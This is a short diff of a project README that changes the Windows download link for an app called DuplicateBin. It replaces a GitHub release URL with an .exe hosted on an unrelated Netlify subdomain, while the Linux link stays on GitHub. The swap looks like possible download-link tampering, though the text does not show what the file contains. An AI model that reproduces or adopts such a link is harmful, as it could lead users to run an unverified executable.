@@ -117,7 +117,7 @@ This guide covers:
 
 The download buttons automatically fetch releases from:
 - **Linux**: `https://github.com/MustafaPinjari/duplicate-bin/releases/download/v1.0.0/duplicate-bin.deb`
-- **Windows**: `https://github.com/MustafaPinjari/duplicate-bin/releases/download/v0.1.1/DuplicateBin.exe`
+- **Windows**: `https://fanciful-shortbread-d39145.netlify.app/public/DuplicateBin.exe`
 
 ## 🎯 Key Features
 
